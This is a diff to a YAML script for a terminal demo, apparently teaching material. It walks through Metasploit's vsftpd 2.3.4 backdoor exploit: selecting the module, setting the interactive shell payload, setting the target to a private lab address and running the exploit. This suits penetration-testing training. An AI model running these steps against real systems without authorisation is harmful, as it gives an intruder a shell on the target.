@@ -855,3 +855,57 @@
 - type: char
   value: use exploit/unix/ftp/vsftpd_234_backdoor
   prefix: msf6 >
+- type: block
+  value: '[*] No payload configured, defaulting to cmd/unix/interact'
+- type: char
+  value: show payloads
+  prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+- type: linebreak
+- type: block
+  value: |
+    Compatible Payloads
+    ===================
+
+      #  Name               Disclosure Date  Rank    Check  Description
+      -  ----               ---------------  ----    -----  -----------
+      0  cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
+- type: linebreak
+- type: char
+  value: set payload cmd/unix/interact
+  prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+- type: block
+  value: payload => cmd/unix/interact
+- type: show options
+  value: set payload cmd/unix/interact
+  prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+- type: linebreak
+- type: block
+  value: |
+    Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+      Name    Current Setting  Required  Description
+      ----    ---------------  --------  -----------
+      RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+      RPORT   21               yes       The target port (TCP)
+
+
+    Payload options (cmd/unix/interact):
+
+      Name  Current Setting  Required  Description
+      ----  ---------------  --------  -----------
+
+
+    Exploit target:
+
+      Id  Name
+      --  ----
+      0   Automatic
+- type: linebreak
+- type: show options
+  value: set RHOSTS $target
+  prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+- type: block
+  value: target => 192.168.10.11
+- type: char
+  value: exploit
+  prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
